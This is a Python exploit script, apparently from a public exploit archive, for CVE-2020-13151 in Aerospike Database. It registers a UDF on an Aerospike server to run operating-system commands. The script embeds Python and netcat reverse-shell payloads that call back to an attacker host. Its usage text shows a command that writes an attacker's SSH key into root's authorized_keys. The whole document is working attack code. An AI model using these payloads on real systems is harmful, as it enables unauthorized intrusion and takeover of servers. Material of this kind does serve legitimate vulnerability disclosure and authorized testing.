# Exploit Title: Aerospike Database 5.1.0.3 - OS Command Execution
# Date: 2020-08-01
# Exploit Author: Matt S
# Vendor Homepage: https://www.aerospike.com/
# Version: < 5.1.0.3
# Tested on: Ubuntu 18.04
# CVE : CVE-2020-13151

#!/usr/bin/env python3
import argparse
import random
import os, sys
from time import sleep
import string

# requires aerospike package from pip
import aerospike
# if this isn't installing, make sure os dependencies are met
# sudo apt-get install python-dev
# sudo apt-get install libssl-dev
# sudo apt-get install python-pip
# sudo apt-get install zlib1g-dev

PYTHONSHELL = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&"""
NETCATSHELL = 'rm /tmp/ft;mkfifo /tmp/ft;cat /tmp/ft|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/ft&'

def _get_client(cfg):
	try:
  		return aerospike.client({
  			'hosts': [(cfg.ahost, cfg.aport)],
  			 'policies': {'timeout': 8000}}).connect()

	except Exception as e:
	  	print(f"unable to access cluster @ {cfg.ahost}:{cfg.aport}\n{e.msg}")

def _send(client, cfg, _cmd):
	try:
		print(client.apply((cfg.namespace, cfg.setname, cfg.dummystring ), 'poc', 'runCMD', [_cmd]))
	except Exception as e:
		print(f"[-] UDF execution returned {e.msg}")

def _register_udf(client, cfg):
	try:
		client.udf_put(cfg.udfpath)
	except Exception as e:
		print(f"[-] whoops, couldn't register the udf {cfg.udfpath}")
		raise e

def _random_string(l):
	return ''.join([random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(l)])

def _populate_table(client, cfg):
	ns = cfg.namespace
	setname = cfg.setname
	print(f"[+] writing to {ns}.{setname}")
	try:
		rec = cfg.dummystring
		client.put((ns, setname, rec), {'pk':cfg.dummystring})
		print(f"[+] wrote {rec}")
	except Exception as e:
		print(f"[-] unable to write record: {e.msg}")
		try:
			if e.msg.startswith('Invalid namespace'):
				print("Valid namespaces: ")
				for n in _info_parse("namespaces", client).split(";"):
					print(n.strip())
		except:
			pass
		sys.exit(13)

def _info_parse(k, client):
	try:
		return [i[1] for i in client.info_all(k).values() ][0]
	except Exception as e:
		print(f"error retrieving information: {e.msg}")
		return []

def _is_vuln(_mj, _mi, _pt, _bd):
	fixed = [5,1,0,0]
	found = [_mj, _mi, _pt, _bd]

	if fixed == found:
		return False

	for ix, val in enumerate(found):
		if val < fixed[ix]:
			return True
		elif val == fixed[ix]:
			pass
		else:
			return False


def _version_check(client):
	print("[+] aerospike build info: ", end="")
	try:
		_ver = _info_parse("build", client)
		print(_ver)
		mj, mi, pt, bd = [int(i) for i in _ver.split('.')]
		if _is_vuln(mj, mi, pt, bd):
			print("[+] looks vulnerable")
			return
		else:
			print(f"[-] this instance is patched.")
			sys.exit(0)

	except Exception as e:
		print(f"[+] unable to interpret build number due to {e}")
		print("[+] continuing anyway... ")

def _exploit(cfg):
	client = _get_client(cfg)

	if not client:
		return

	_version_check(client)

	print(f"[+] populating dummy table.")
	_populate_table(client, cfg)

	print(f"[+] registering udf")

	_register_udf(client, cfg)

	if cfg.pythonshell or cfg.netcatshell:
		sys.stdout.flush()
		print(f"[+] sending payload, make sure you have a listener on {cfg.lhost}:{cfg.lport}", end="")
		sys.stdout.flush()
		for i in range(4):
			print(".", end="")
			sys.stdout.flush()
			sleep(1)

		print(".")
		_send(client, cfg, PYTHONSHELL.format(ip=cfg.lhost,port=cfg.lport) if cfg.pythonshell else NETCATSHELL.format(ip=cfg.lhost,port=cfg.lport) )

	if cfg.cmd:
		print(f"[+] issuing command \"{cfg.cmd}\"")
		_send(client, cfg, cfg.cmd)

if __name__ == '__main__':
	if len(sys.argv) == 1:
		print(f"[+] usage examples:\n{sys.argv[0]} --ahost 10.11.12.13 --pythonshell --lhost=10.0.0.1 --lport=8000")
		print("... or ... ")
		print(f"{sys.argv[0]} --ahost 10.11.12.13 --cmd 'echo MYPUBKEY > /root/.ssh/authorized_keys'")
		sys.exit(0)

	parser = argparse.ArgumentParser(description='Aerospike UDF Command Execution - CVE-2020-13151 - POC')

	parser.add_argument("--ahost", help="Aerospike host, default 127.0.0.1", default="127.0.0.1")
	parser.add_argument("--aport", help="Aerospike port, default 3000", default=3000, type=int)
	parser.add_argument("--namespace", help="Namespace in which to create the record set", default="test")
	parser.add_argument("--setname", help="Name of set to populate with dummy record(s), default is cve202013151", default=None)
	parser.add_argument('--dummystring', help="leave blank for a random value, can use a previously written key to target a specific cluster node", default=None)
	parser.add_argument("--pythonshell", help="attempt to use a python reverse shell (requires lhost and lport)", action="store_true")
	parser.add_argument("--netcatshell", help="attempt to use a netcat reverse shell (requires lhost and lport)", action="store_true")
	parser.add_argument("--lhost", help="host to use for reverse shell callback")
	parser.add_argument("--lport", help="port to use for reverse shell callback")
	parser.add_argument("--cmd", help="custom command to issue against the underlying host")
	parser.add_argument('--udfpath', help="where is the udf to distribute? defaults to `pwd`/poc.lua", default=None)

	cfg = parser.parse_args()
	if not cfg.setname:
		cfg.setname = 'cve202013151'
	if not cfg.dummystring:
		cfg.dummystring = _random_string(16)
	if not cfg.udfpath:
		cfg.udfpath = os.path.join(os.getcwd(), 'poc.lua')

	assert cfg.cmd or (cfg.lhost and cfg.lport and (cfg.pythonshell or cfg.netcatshell)), "Must specify a command, or a reverse shell + lhost + lport"
	if cfg.pythonshell or cfg.netcatshell:
		assert cfg.lhost and cfg.lport, "Must specify lhost and lport if using a reverse shell"

	_exploit(cfg)